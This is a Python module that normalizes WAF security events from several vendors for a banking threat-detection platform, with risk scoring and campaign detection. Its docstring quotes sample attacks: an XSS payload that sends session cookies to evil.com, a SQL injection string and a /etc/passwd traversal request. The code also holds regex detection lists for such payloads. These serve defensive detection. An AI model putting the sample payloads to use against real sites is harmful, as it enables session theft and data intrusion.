"""
Layer 1 — Data Ingestion
Web Application Firewall (WAF) Normalizer

Converts WAF security events from multiple
vendors into DataAccessEvent format.

WAF SOURCES HANDLED:
    AWS WAF:
        CloudWatch Logs format
        SQL injection rule matches
        XSS rule matches
        Rate limiting blocks
        Managed rule group matches
        Geographic blocks
    
    Azure WAF (Application Gateway + Front Door):
        Diagnostic Logs format
        OWASP rule matches
        Custom rule blocks
        Bot protection events
    
    Cloudflare WAF:
        Logpush format
        Firewall rule matches
        Rate limiting events
        Bot fight mode
        DDoS mitigation
    
    ModSecurity (standalone/NGINX/Apache):
        Apache/NGINX error log format
        OWASP CRS rule matches
        Paranoia level alerts

WHY WAF MATTERS FOR BANKS:
    Banks expose APIs and web portals to the internet.
    Attackers probe these 24/7 automatically.
    
    TOP ATTACKS WAF BLOCKS AND YOUR PLATFORM SCORES:
    
    SQL INJECTION:
    "SELECT * FROM accounts WHERE id=1 OR 1=1--"
    Attacker reads entire customer database.
    WAF blocks. Your platform: was it part of campaign?
    
    CROSS-SITE SCRIPTING (XSS):
    "<script>document.location='http://evil.com/steal?
     cookie='+document.cookie</script>"
    Attacker steals session tokens.
    WAF blocks. Your platform: LSTM detects campaign.
    
    PATH TRAVERSAL:
    "GET /../../../etc/passwd"
    Attacker reads server files.
    WAF blocks. Your platform: GNN flags attacker IP.
    
    CREDENTIAL STUFFING VIA WEB:
    1000 login attempts per minute.
    WAF rate limits. Your platform: CRITICAL campaign.
    
    API ENUMERATION:
    Attacker probes every API endpoint.
    WAF detects pattern. Your platform: full picture.
    
    BUSINESS LOGIC ATTACKS:
    Manipulating payment amounts.
    Bypassing authorization checks.
    WAF may miss. Your ML catches anomaly.

YOUR ML MODELS ON WAF DATA:
    IsolationForest:
    Unusual request volumes and patterns.
    
    LSTMDetector:
    Sustained attack campaigns over hours/days.
    Same attacker IP returning repeatedly.
    
    GNNDetector:
    Attacker IP connected to known threat infra.
    Same IP attacking multiple applications.
    
    DNSClassifier:
    Malicious domain in request headers/referrer.
    
    PIIClassifier:
    Attack targeting PCI/PHI data endpoints.

USAGE:
    normalizer = WAFNormalizer()
    
    # Auto-detects source
    event = normalizer.normalize(waf_event)
    
    # AWS WAF specifically
    event = normalizer.normalize_aws_waf(aws_event)
    
    # Cloudflare WAF
    event = normalizer.normalize_cloudflare(cf_event)
    
    # Check if attack is part of campaign
    campaign = normalizer.detect_campaign(events)
"""

import logging
import re
from datetime import datetime
from datetime import timezone

logger = logging.getLogger(__name__)

# WAF action types mapped to risk scores
WAF_ACTION_RISK = {
    # Blocked events — high risk
    "BLOCK":    0.70,
    "block":    0.70,
    "BLOCKED":  0.70,
    "deny":     0.70,
    "DROP":     0.70,

    # Counted/logged — medium risk
    "COUNT":    0.40,
    "count":    0.40,
    "LOG":      0.35,
    "log":      0.35,

    # Challenged — medium risk
    "CAPTCHA":  0.45,
    "captcha":  0.45,
    "CHALLENGE": 0.45,
    "challenge": 0.45,

    # Allowed (but matched rule) — low-medium
    "ALLOW":    0.25,
    "allow":    0.25,
    "PERMIT":   0.25,
}

# Attack type risk scores and MITRE mapping
ATTACK_TYPE_RISK = {
    # Injection attacks
    "SQLi":                 {"risk": 0.85, "mitre": "T1190"},
    "SQL_INJECTION":        {"risk": 0.85, "mitre": "T1190"},
    "SQL Injection":        {"risk": 0.85, "mitre": "T1190"},
    "sqli":                 {"risk": 0.85, "mitre": "T1190"},

    # XSS attacks
    "XSS":                  {"risk": 0.75, "mitre": "T1059.007"},
    "CrossSiteScripting":   {"risk": 0.75, "mitre": "T1059.007"},
    "Cross-Site Scripting": {"risk": 0.75, "mitre": "T1059.007"},
    "xss":                  {"risk": 0.75, "mitre": "T1059.007"},

    # Path traversal
    "LFI":                  {"risk": 0.80, "mitre": "T1083"},
    "RFI":                  {"risk": 0.82, "mitre": "T1190"},
    "PathTraversal":        {"risk": 0.78, "mitre": "T1083"},
    "DirectoryTraversal":   {"risk": 0.78, "mitre": "T1083"},

    # Command injection
    "RCE":                  {"risk": 0.95, "mitre": "T1190"},
    "CommandInjection":     {"risk": 0.95, "mitre": "T1059"},
    "CodeInjection":        {"risk": 0.90, "mitre": "T1059"},
    "OS_Command_Injection": {"risk": 0.95, "mitre": "T1059"},

    # Authentication attacks
    "BruteForce":           {"risk": 0.70, "mitre": "T1110"},
    "CredentialStuffing":   {"risk": 0.80, "mitre": "T1110.004"},
    "AccountTakeover":      {"risk": 0.85, "mitre": "T1078"},

    # Scanning/enumeration
    "Scanner":              {"risk": 0.50, "mitre": "T1595"},
    "APIEnumeration":       {"risk": 0.60, "mitre": "T1595.003"},
    "DirectoryBrute":       {"risk": 0.55, "mitre": "T1083"},

    # Protocol attacks
    "ProtocolViolation":    {"risk": 0.65, "mitre": "T1190"},
    "HTTPViolation":        {"risk": 0.60, "mitre": "T1190"},
    "InvalidRequest":       {"risk": 0.45, "mitre": "T1190"},

    # Bot attacks
    "BadBot":               {"risk": 0.55, "mitre": "T1595"},
    "DDoS":                 {"risk": 0.75, "mitre": "T1498"},
    "RateLimited":          {"risk": 0.50, "mitre": "T1498.001"},
}

# High value API endpoints for banks
HIGH_VALUE_ENDPOINTS = [
    "/api/accounts", "/api/customers", "/api/payments",
    "/api/transfers", "/api/cards", "/api/loans",
    "/admin", "/api/admin", "/management",
    "/api/v1/users", "/api/v2/users",
    "/login", "/auth", "/oauth", "/token",
    "/api/pii", "/api/phi", "/api/records"
]

# SQL injection patterns for detection
SQLI_PATTERNS = [
    r"(\bOR\b|\bAND\b)\s+\d+=\d+",
    r"UNION\s+SELECT",
    r"SELECT\s+\*\s+FROM",
    r"DROP\s+TABLE",
    r"INSERT\s+INTO",
    r"--\s*$",
    r";\s*(DROP|INSERT|UPDATE|DELETE)",
    r"'.*'.*=.*'.*'",
    r"1\s*=\s*1",
    r"sleep\s*\(\s*\d+\s*\)",
    r"benchmark\s*\(",
    r"information_schema",
    r"xp_cmdshell",
]

# XSS patterns
XSS_PATTERNS = [
    r"<script[^>]*>",
    r"javascript:",
    r"on\w+\s*=",
    r"<iframe",
    r"document\.cookie",
    r"document\.location",
    r"eval\s*\(",
    r"alert\s*\(",
    r"String\.fromCharCode",
]

# Path traversal patterns
PATH_TRAVERSAL_PATTERNS = [
    r"\.\./",
    r"\.\.\\",
    r"%2e%2e%2f",
    r"%252e%252e",
    r"/etc/passwd",
    r"/etc/shadow",
    r"boot\.ini",
    r"win\.ini",
]


class WAFNormalizer:
    """
    Normalizes Web Application Firewall events
    from multiple vendors into DataAccessEvent.

    Handles: AWS WAF, Azure WAF, Cloudflare WAF,
    ModSecurity.
    """

    def __init__(self):
        self.source_system = "waf"

    def normalize(self, raw_event: dict) -> dict:
        """
        Normalize WAF event.
        Auto-detects source vendor.

        Args:
            raw_event: WAF event dict

        Returns:
            DataAccessEvent compatible dict
        """
        if not raw_event:
            return self._empty_event()

        source = self._detect_source(raw_event)

        if source == "aws_waf":
            return self.normalize_aws_waf(raw_event)
        elif source == "azure_waf":
            return self.normalize_azure_waf(raw_event)
        elif source == "cloudflare":
            return self.normalize_cloudflare(raw_event)
        elif source == "modsecurity":
            return self.normalize_modsecurity(raw_event)
        else:
            return self._normalize_generic(raw_event)

    def normalize_aws_waf(
        self, raw_event: dict
    ) -> dict:
        """
        Normalize AWS WAF CloudWatch log event.

        AWS WAF logs to CloudWatch or S3.
        Format is consistent across all rule groups.
        """
        http_req = raw_event.get(
            "httpRequest", {}
        )
        action = raw_event.get("action", "ALLOW")
        timestamp = raw_event.get("timestamp", 0)

        client_ip = http_req.get("clientIp", "")
        uri = http_req.get("uri", "")
        args = http_req.get("args", "")
        method = http_req.get("httpMethod", "GET")
        country = http_req.get("country", "")
        headers = http_req.get("headers", [])

        user_agent = next(
            (
                h.get("value", "")
                for h in headers
                if h.get("name", "").lower() == "user-agent"
            ),
            ""
        )

        host = next(
            (
                h.get("value", "")
                for h in headers
                if h.get("name", "").lower() == "host"
            ),
            ""
        )

        rule_groups = raw_event.get(
            "ruleGroupList", []
        )
        matched_rules = []
        for rg in rule_groups:
            term_rule = rg.get("terminatingRule")
            if term_rule:
                matched_rules.append(
                    term_rule.get("ruleId", "")
                )
            non_term = rg.get(
                "nonTerminatingMatchingRules", []
            )
            for r in non_term:
                matched_rules.append(
                    r.get("ruleId", "")
                )

        attack_type = self._detect_attack_type(
            uri, args, matched_rules, user_agent
        )

        event_time = self._parse_aws_timestamp(
            timestamp
        )

        base_risk = WAF_ACTION_RISK.get(action, 0.30)
        attack_info = ATTACK_TYPE_RISK.get(
            attack_type, {"risk": 0.40, "mitre": "T1190"}
        )
        risk_score = max(
            base_risk, attack_info["risk"]
        )

        risk_reasons = [
            f"waf_action:{action}",
            f"attack_type:{attack_type}"
        ]

        if self._is_high_value_endpoint(uri):
            risk_score = min(risk_score + 0.10, 1.0)
            risk_reasons.append(
                "high_value_endpoint_targeted"
            )

        if client_ip.startswith("185.220"):
            risk_score = min(risk_score + 0.15, 1.0)
            risk_reasons.append("tor_exit_node")

        sqli_found = self._detect_sqli(
            args + " " + uri
        )
        if sqli_found:
            risk_score = min(
                max(risk_score, 0.85), 1.0
            )
            risk_reasons.append(
                "sql_injection_pattern_detected"
            )

        xss_found = self._detect_xss(args + " " + uri)
        if xss_found:
            risk_score = min(
                max(risk_score, 0.75), 1.0
            )
            risk_reasons.append(
                "xss_pattern_detected"
            )

        path_traversal = self._detect_path_traversal(
            uri + " " + args
        )
        if path_traversal:
            risk_score = min(
                max(risk_score, 0.78), 1.0
            )
            risk_reasons.append(
                "path_traversal_detected"
            )

        classification = self._detect_classification(
            uri, host
        )

        return {
            "accessor_identity": (
                client_ip or "unknown-client"
            ),
            "accessor_type": "api_key",
            "data_store_name": host or "web-application",
            "data_path": f"{method} {uri}",
            "data_classification": classification,
            "bytes_accessed": int(
                raw_event.get("responseCodeSent", 0)
            ),
            "event_time": event_time,
            "source_ip": client_ip,
            "risk_score": risk_score,
            "risk_reasons": risk_reasons,
            "source_system": "waf_aws",
            "raw_event": raw_event,
            "waf_action": action,
            "waf_attack_type": attack_type,
            "waf_matched_rules": matched_rules,
            "waf_uri": uri,
            "waf_args": args[:500],
            "waf_method": method,
            "waf_country": country,
            "waf_user_agent": user_agent[:200],
            "waf_mitre": attack_info["mitre"],
            "waf_sqli_detected": sqli_found,
            "waf_xss_detected": xss_found,
            "waf_path_traversal": path_traversal
        }

    def normalize_azure_waf(
        self, raw_event: dict
    ) -> dict:
        """
        Normalize Azure WAF diagnostic log.
        Covers Application Gateway WAF
        and Azure Front Door WAF.
        """
        properties = raw_event.get(
            "properties", raw_event
        )

        action = properties.get(
            "action",
            properties.get("Action", "Detected")
        )
        client_ip = properties.get(
            "clientIp",
            properties.get("clientIP", "")
        )
        uri = properties.get(
            "requestUri",
            properties.get("RequestUri", "")
        )
        rule_id = properties.get(
            "ruleId",
            properties.get("RuleId", "")
        )
        rule_group = properties.get(
            "ruleGroup",
            properties.get("RuleGroup", "")
        )
        message = properties.get(
            "message",
            properties.get("Message", "")
        )
        host = properties.get(
            "hostname",
            properties.get("Hostname", "")
        )
        method = properties.get("Method", "GET")
        policy_mode = properties.get(
            "policyMode", "Detection"
        )

        attack_type = self._detect_attack_from_rule(
            rule_id, rule_group, message
        )
        attack_info = ATTACK_TYPE_RISK.get(
            attack_type,
            {"risk": 0.50, "mitre": "T1190"}
        )

        base_risk = WAF_ACTION_RISK.get(
            action, 0.45
        )
        risk_score = max(
            base_risk, attack_info["risk"]
        )

        risk_reasons = [
            f"azure_waf_action:{action}",
            f"azure_waf_rule:{rule_id}",
            f"attack_type:{attack_type}"
        ]

        if policy_mode == "Prevention":
            risk_reasons.append(
                "waf_prevention_mode_block"
            )

        if self._is_high_value_endpoint(uri):
            risk_score = min(risk_score + 0.10, 1.0)
            risk_reasons.append(
                "high_value_endpoint_targeted"
            )

        return {
            "accessor_identity": (
                client_ip or "unknown-client"
            ),
            "accessor_type": "api_key",
            "data_store_name": (
                host or "azure-web-application"
            ),
            "data_path": f"{method} {uri}",
            "data_classification": (
                self._detect_classification(uri, host)
            ),
            "bytes_accessed": 0,
            "event_time": raw_event.get(
                "time",
                raw_event.get(
                    "timeStamp", _now()
                )
            ),
            "source_ip": client_ip,
            "risk_score": min(risk_score, 1.0),
            "risk_reasons": risk_reasons,
            "source_system": "waf_azure",
            "raw_event": raw_event,
            "waf_action": action,
            "waf_attack_type": attack_type,
            "waf_rule_id": rule_id,
            "waf_rule_group": rule_group,
            "waf_message": message[:500],
            "waf_uri": uri,
            "waf_method": method,
            "waf_mitre": attack_info["mitre"]
        }

    def normalize_cloudflare(
        self, raw_event: dict
    ) -> dict:
        """
        Normalize Cloudflare WAF Logpush event.
        Cloudflare protects millions of sites.
        Most common WAF for web-facing applications.
        """
        action = raw_event.get(
            "WAFAction",
            raw_event.get("Action", "unknown")
        )
        client_ip = raw_event.get(
            "ClientIP",
            raw_event.get("ClientIPAddress", "")
        )
        uri = raw_event.get(
            "ClientRequestPath",
            raw_event.get("RequestPath", "")
        )
        query = raw_event.get(
            "ClientRequestQuery",
            raw_event.get("RequestQuery", "")
        )
        method = raw_event.get(
            "ClientRequestMethod",
            raw_event.get("RequestMethod", "GET")
        )
        rule_id = raw_event.get(
            "WAFRuleID",
            raw_event.get("FirewallRuleID", "")
        )
        rule_message = raw_event.get(
            "WAFRuleMessage",
            raw_event.get("RuleMessage", "")
        )
        host = raw_event.get(
            "ClientRequestHost",
            raw_event.get("RequestHost", "")
        )
        country = raw_event.get(
            "ClientCountry", ""
        )
        user_agent = raw_event.get(
            "ClientRequestUserAgent", ""
        )
        edge_time = raw_event.get(
            "EdgeStartTimestamp",
            raw_event.get("Datetime", _now())
        )
        bot_score = int(
            raw_event.get("BotScore", 100)
        )

        attack_type = self._detect_attack_from_rule(
            rule_id, "", rule_message
        )

        if not attack_type or attack_type == "Unknown":
            attack_type = self._detect_attack_type(
                uri, query, [rule_id], user_agent
            )

        attack_info = ATTACK_TYPE_RISK.get(
            attack_type,
            {"risk": 0.50, "mitre": "T1190"}
        )

        base_risk = WAF_ACTION_RISK.get(
            action.lower(), 0.40
        )
        risk_score = max(
            base_risk, attack_info["risk"]
        )

        risk_reasons = [
            f"cloudflare_action:{action}",
            f"attack_type:{attack_type}"
        ]

        if bot_score < 30:
            risk_score = min(risk_score + 0.10, 1.0)
            risk_reasons.append(
                f"bot_score_low:{bot_score}"
            )

        if country in [
            "RU", "CN", "KP", "IR", "SY"
        ]:
            risk_score = min(risk_score + 0.05, 1.0)
            risk_reasons.append(
                f"high_risk_country:{country}"
            )

        sqli = self._detect_sqli(
            query + " " + uri
        )
        if sqli:
            risk_score = min(
                max(risk_score, 0.85), 1.0
            )
            risk_reasons.append(
                "sql_injection_pattern"
            )

        return {
            "accessor_identity": (
                client_ip or "unknown-client"
            ),
            "accessor_type": "api_key",
            "data_store_name": (
                host or "cloudflare-protected-app"
            ),
            "data_path": f"{method} {uri}",
            "data_classification": (
                self._detect_classification(uri, host)
            ),
            "bytes_accessed": int(
                raw_event.get(
                    "EdgeResponseBytes", 0
                )
            ),
            "event_time": str(edge_time),
            "source_ip": client_ip,
            "risk_score": min(risk_score, 1.0),
            "risk_reasons": risk_reasons,
            "source_system": "waf_cloudflare",
            "raw_event": raw_event,
            "waf_action": action,
            "waf_attack_type": attack_type,
            "waf_rule_id": rule_id,
            "waf_rule_message": rule_message[:300],
            "waf_uri": uri,
            "waf_query": query[:300],
            "waf_method": method,
            "waf_country": country,
            "waf_bot_score": bot_score,
            "waf_mitre": attack_info["mitre"],
            "waf_sqli_detected": sqli
        }

    def normalize_modsecurity(
        self, raw_event: dict
    ) -> dict:
        """
        Normalize ModSecurity log event.
        ModSecurity runs on Apache/NGINX.
        Uses OWASP Core Rule Set (CRS).
        """
        action = raw_event.get(
            "action", "block"
        )
        client_ip = raw_event.get(
            "client_ip",
            raw_event.get("src_ip", "")
        )
        uri = raw_event.get(
            "request_uri",
            raw_event.get("uri", "")
        )
        method = raw_event.get("method", "GET")
        rule_id = str(
            raw_event.get(
                "rule_id",
                raw_event.get("id", "")
            )
        )
        message = raw_event.get(
            "message",
            raw_event.get("msg", "")
        )
        data = raw_event.get("data", "")
        host = raw_event.get("host", "")
        severity = raw_event.get(
            "severity", "NOTICE"
        )

        attack_type = self._detect_attack_from_rule(
            rule_id, "", message
        )

        if not attack_type or attack_type == "Unknown":
            attack_type = self._detect_attack_type(
                uri, data, [rule_id], ""
            )

        attack_info = ATTACK_TYPE_RISK.get(
            attack_type,
            {"risk": 0.50, "mitre": "T1190"}
        )

        severity_risk = {
            "EMERGENCY": 0.95,
            "ALERT":     0.85,
            "CRITICAL":  0.80,
            "ERROR":     0.70,
            "WARNING":   0.55,
            "NOTICE":    0.40,
            "INFO":      0.25,
            "DEBUG":     0.10
        }

        base_risk = severity_risk.get(
            severity.upper(), 0.40
        )
        risk_score = max(
            base_risk, attack_info["risk"]
        )

        risk_reasons = [
            f"modsec_severity:{severity}",
            f"modsec_rule:{rule_id}",
            f"attack_type:{attack_type}"
        ]

        sqli = self._detect_sqli(
            data + " " + uri
        )
        if sqli:
            risk_score = min(
                max(risk_score, 0.85), 1.0
            )
            risk_reasons.append(
                "sqli_payload_in_data"
            )

        return {
            "accessor_identity": (
                client_ip or "unknown-client"
            ),
            "accessor_type": "api_key",
            "data_store_name": (
                host or "modsec-protected-app"
            ),
            "data_path": f"{method} {uri}",
            "data_classification": (
                self._detect_classification(uri, host)
            ),
            "bytes_accessed": 0,
            "event_time": raw_event.get(
                "timestamp", _now()
            ),
            "source_ip": client_ip,
            "risk_score": min(risk_score, 1.0),
            "risk_reasons": risk_reasons,
            "source_system": "waf_modsecurity",
            "raw_event": raw_event,
            "waf_action": action,
            "waf_attack_type": attack_type,
            "waf_rule_id": rule_id,
            "waf_message": message[:500],
            "waf_data": data[:300],
            "waf_severity": severity,
            "waf_mitre": attack_info["mitre"],
            "waf_sqli_detected": sqli
        }

    def detect_campaign(
        self,
        events: list,
        window_minutes: int = 60,
        threshold: int = 10
    ) -> dict:
        """
        Detect coordinated attack campaigns.
        Multiple WAF events from same IP or
        targeting same endpoint = campaign.

        Args:
            events: List of normalized WAF events
            window_minutes: Time window to analyze
            threshold: Min events to flag campaign

        Returns:
            dict with campaign analysis
        """
        if not events:
            return {
                "campaign_detected": False,
                "event_count": 0
            }

        ip_counts = {}
        endpoint_counts = {}
        attack_types = {}

        for event in events:
            ip = event.get("source_ip", "")
            uri = event.get("waf_uri", "")
            attack = event.get("waf_attack_type", "")

            if ip:
                ip_counts[ip] = ip_counts.get(ip, 0) + 1
            if uri:
                endpoint_counts[uri] = (
                    endpoint_counts.get(uri, 0) + 1
                )
            if attack:
                attack_types[attack] = (
                    attack_types.get(attack, 0) + 1
                )

        top_ip = max(
            ip_counts.items(),
            key=lambda x: x[1],
            default=("", 0)
        )
        top_endpoint = max(
            endpoint_counts.items(),
            key=lambda x: x[1],
            default=("", 0)
        )
        top_attack = max(
            attack_types.items(),
            key=lambda x: x[1],
            default=("", 0)
        )

        campaign_detected = (
            top_ip[1] >= threshold or
            top_endpoint[1] >= threshold
        )

        campaign_risk = 0.0
        if campaign_detected:
            campaign_risk = min(
                0.50 + (top_ip[1] / 100), 0.95
            )

        return {
            "campaign_detected": campaign_detected,
            "event_count": len(events),
            "top_attacker_ip": top_ip[0],
            "top_attacker_count": top_ip[1],
            "top_targeted_endpoint": top_endpoint[0],
            "top_attack_type": top_attack[0],
            "unique_ips": len(ip_counts),
            "campaign_risk_score": campaign_risk,
            "recommendation": (
                f"BLOCK {top_ip[0]} at firewall. "
                f"Rate limit {top_endpoint[0]}."
                if campaign_detected
                else "Normal WAF activity"
            )
        }

    # ============================================================
    # DETECTION HELPERS
    # ============================================================

    def _detect_source(
        self, raw_event: dict
    ) -> str:
        """Auto-detect WAF vendor"""
        if "httpRequest" in raw_event:
            return "aws_waf"
        if "ruleGroupList" in raw_event:
            return "aws_waf"
        if "WAFAction" in raw_event:
            return "cloudflare"
        if "ClientRequestPath" in raw_event:
            return "cloudflare"
        if "WAFRuleID" in raw_event:
            return "cloudflare"

        props = raw_event.get("properties", {})
        if "ruleId" in props:
            return "azure_waf"
        if "requestUri" in props:
            return "azure_waf"
        if "policyMode" in raw_event:
            return "azure_waf"

        if "rule_id" in raw_event:
            return "modsecurity"
        if "modsec" in str(
            raw_event.get("source", "")
        ).lower():
            return "modsecurity"

        return "generic"

    def _detect_attack_type(
        self,
        uri: str,
        args: str,
        rules: list,
        user_agent: str
    ) -> str:
        """Detect attack type from URI, args, rules"""
        combined = (
            uri + " " + args + " " +
            " ".join(rules)
        ).lower()

        if any(
            kw in combined
            for kw in [
                "sqli", "sql_injection",
                "sql injection", "union select",
                "1=1", "or 1=1"
            ]
        ):
            return "SQLi"

        if any(
            kw in combined
            for kw in [
                "xss", "crosssitescripting",
                "script", "javascript:"
            ]
        ):
            return "XSS"

        if any(
            kw in combined
            for kw in [
                "lfi", "rfi", "traversal",
                "../", "etc/passwd"
            ]
        ):
            return "PathTraversal"

        if any(
            kw in combined
            for kw in [
                "rce", "cmdinject",
                "commandinjection", "exec("
            ]
        ):
            return "RCE"

        if any(
            kw in combined
            for kw in [
                "scanner", "nikto", "nessus",
                "nmap", "masscan"
            ]
        ):
            return "Scanner"

        ua_lower = user_agent.lower()
        if any(
            kw in ua_lower
            for kw in [
                "sqlmap", "nikto", "nessus",
                "masscan", "zgrab", "python-requests"
            ]
        ):
            return "Scanner"

        if any(
            kw in combined
            for kw in [
                "bruteforce", "brute_force",
                "login", "password"
            ]
        ):
            return "BruteForce"

        return "Unknown"

    def _detect_attack_from_rule(
        self,
        rule_id: str,
        rule_group: str,
        message: str
    ) -> str:
        """Detect attack from rule ID and message"""
        combined = (
            rule_id + " " +
            rule_group + " " +
            message
        ).lower()

        if any(
            kw in combined
            for kw in [
                "sqli", "sql", "injection"
            ]
        ):
            return "SQLi"

        if any(
            kw in combined
            for kw in ["xss", "script", "cross"]
        ):
            return "XSS"

        if any(
            kw in combined
            for kw in [
                "lfi", "rfi", "traversal",
                "path", "inclusion"
            ]
        ):
            return "PathTraversal"

        if any(
            kw in combined
            for kw in [
                "rce", "command", "shell",
                "exec", "code"
            ]
        ):
            return "RCE"

        if any(
            kw in combined
            for kw in ["bot", "scanner", "crawl"]
        ):
            return "Scanner"

        if any(
            kw in combined
            for kw in [
                "brute", "credential",
                "login", "auth"
            ]
        ):
            return "BruteForce"

        if any(
            kw in combined
            for kw in [
                "rate", "limit", "throttle", "ddos"
            ]
        ):
            return "RateLimited"

        return "Unknown"

    def _detect_sqli(self, text: str) -> bool:
        """Detect SQL injection patterns"""
        if not text:
            return False
        text_lower = text.lower()
        for pattern in SQLI_PATTERNS:
            if re.search(
                pattern, text_lower,
                re.IGNORECASE
            ):
                return True
        return False

    def _detect_xss(self, text: str) -> bool:
        """Detect XSS patterns"""
        if not text:
            return False
        for pattern in XSS_PATTERNS:
            if re.search(
                pattern, text,
                re.IGNORECASE
            ):
                return True
        return False

    def _detect_path_traversal(
        self, text: str
    ) -> bool:
        """Detect path traversal patterns"""
        if not text:
            return False
        for pattern in PATH_TRAVERSAL_PATTERNS:
            if re.search(
                pattern, text,
                re.IGNORECASE
            ):
                return True
        return False

    def _is_high_value_endpoint(
        self, uri: str
    ) -> bool:
        """Check if URI targets high value endpoint"""
        uri_lower = uri.lower()
        return any(
            ep in uri_lower
            for ep in HIGH_VALUE_ENDPOINTS
        )

    def _detect_classification(
        self,
        uri: str,
        host: str
    ) -> str:
        """Detect data classification from URI"""
        combined = (uri + " " + host).lower()

        if any(
            kw in combined
            for kw in [
                "pci", "card", "payment",
                "credit", "billing"
            ]
        ):
            return "PCI"

        if any(
            kw in combined
            for kw in [
                "phi", "health", "medical",
                "patient", "hipaa"
            ]
        ):
            return "PHI"

        if any(
            kw in combined
            for kw in [
                "pii", "customer", "personal",
                "user", "account", "member"
            ]
        ):
            return "PII"

        return "UNKNOWN"

    def _parse_aws_timestamp(
        self, timestamp
    ) -> str:
        """Parse AWS WAF epoch timestamp"""
        try:
            if isinstance(timestamp, (int, float)):
                ts = timestamp / 1000
                return datetime.fromtimestamp(
                    ts, tz=timezone.utc
                ).strftime("%Y-%m-%dT%H:%M:%SZ")
            return str(timestamp) or _now()
        except Exception:
            return _now()

    def _normalize_generic(
        self, raw_event: dict
    ) -> dict:
        """Generic WAF normalization fallback"""
        action = (
            raw_event.get("action", "")
            or raw_event.get("Action", "UNKNOWN")
        )
        client_ip = (
            raw_event.get("client_ip", "")
            or raw_event.get("clientIp", "")
            or raw_event.get("ClientIP", "")
        )
        uri = (
            raw_event.get("uri", "")
            or raw_event.get("requestUri", "")
            or raw_event.get("path", "")
        )

        risk_score = WAF_ACTION_RISK.get(
            action, 0.35
        )

        return {
            "accessor_identity": (
                client_ip or "unknown"
            ),
            "accessor_type": "api_key",
            "data_store_name": "web-application",
            "data_path": uri,
            "data_classification": (
                self._detect_classification(uri, "")
            ),
            "bytes_accessed": 0,
            "event_time": _now(),
            "source_ip": client_ip,
            "risk_score": risk_score,
            "risk_reasons": [
                f"waf_action:{action}"
            ],
            "source_system": "waf_generic",
            "raw_event": raw_event,
            "waf_action": action,
            "waf_attack_type": "Unknown"
        }

    def _empty_event(self) -> dict:
        """Empty event for invalid input"""
        return {
            "accessor_identity": "unknown",
            "accessor_type": "api_key",
            "data_store_name": "unknown",
            "data_path": "",
            "data_classification": "UNKNOWN",
            "bytes_accessed": 0,
            "event_time": _now(),
            "source_ip": "",
            "risk_score": 0.0,
            "risk_reasons": [],
            "source_system": "waf",
            "raw_event": {}
        }


def _now() -> str:
    return datetime.now(
        timezone.utc
    ).strftime("%Y-%m-%dT%H:%M:%S.%fZ")